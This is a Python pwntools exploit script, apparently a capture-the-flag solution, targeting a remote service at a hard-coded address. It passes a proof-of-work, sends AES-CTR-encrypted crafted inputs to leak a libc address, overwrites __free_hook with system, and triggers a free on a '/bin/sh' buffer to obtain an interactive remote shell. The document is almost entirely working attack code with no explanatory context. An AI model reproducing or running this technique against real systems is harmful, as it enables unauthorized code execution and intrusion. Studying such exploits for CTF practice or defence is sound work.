from base64 import b64encode
from pwn import *
 
def aesctr(data):
    ctr = [0xb0, 0x63, 0xe2, 0x8a, 0x01, 0x37, 0xaf, 0x81, 0x3c, 0xc0, 0x10, 0x46, 0xb2, 0xf0, 0x56, 0xec, 0x76, 0xfc, 0x22, 0x53, 0xdf, 0x8a, 0xc1, 0xf6, 0x8b, 0x02, 0xfa, 0x05, 0x8c, 0xb1, 0x5f, 0x03, 0x5a, 0x53, 0x31, 0xc5, 0x47, 0xfd, 0xa9, 0x3d, 0x19, 0x66, 0x86, 0xc6, 0x08, 0x6c, 0x95, 0x68, 0x45, 0x92, 0xa1, 0xd6, 0xcd, 0xd4, 0x69, 0x01, 0xd7, 0xae, 0x74, 0x4b, 0xdd, 0xb3, 0x3b, 0xb5, 0x82, 0x32, 0x85, 0xd7, 0x30, 0xd0, 0xf5, 0x7d, 0x49, 0x75, 0xcf, 0x72, 0xfe, 0x6b, 0x3b, 0xdf, 0x5c, 0x3a, 0xcd, 0xab, 0xfc, 0xa1, 0xab, 0x86, 0x0b, 0x9e, 0x75, 0x9b, 0x7b, 0xf9, 0xfe, 0x0b, 0xad, 0x97, 0xe1, 0xdf, 0x2f, 0x01, 0x9a, 0x85, 0x30, 0xbf, 0xe1, 0xb3, 0x40, 0x2a, 0x46, 0xc3]
    enc = list(data)
    for i in range(len(data)):
        enc[i] ^= ctr[i]
    return bytes(enc)
 
r = remote("35.187.205.111", 10005)
 
r.recvuntil("Solve Pow! ")
print(r.recvline())
hashcash = input()
 
r.sendline(hashcash)
r.sendlineafter(">> ", "1")
 
data = b''
data += b'\x00' * 0x20  # signature
data += p32(19)         # version
data += b'A' * 0x4c     # dummy
data = b'\x00' * 16 + aesctr(data)  # nonce + enc
r.sendlineafter("data: ", b64encode(data))
 
r.sendlineafter(">> ", "4")
r.sendlineafter(">> ", "8")
r.recvuntil("printf: ")
libc = int(r.recvline(), 16) - 0x49200
print("libc: %x" % libc)
 
r.sendlineafter(">> ", "1")
data = b''
data += b'/bin/sh\x00'  # command
data += b'\x00' * 0x18  # signature
data += b'A' * 0x48     # dummy
data += p64(libc + 0x16AC30)    # free_hook
data = b'\x00' * 16 + aesctr(data)  # nonce + enc
r.sendlineafter("data: ", b64encode(data))
 
r.sendlineafter(">> ", "7")
r.sendlineafter("Data: ", p64(libc + 0x3F970))   # system
 
r.sendlineafter(">> ", "3") # free ta_resp_buffer
 
r.interactive()
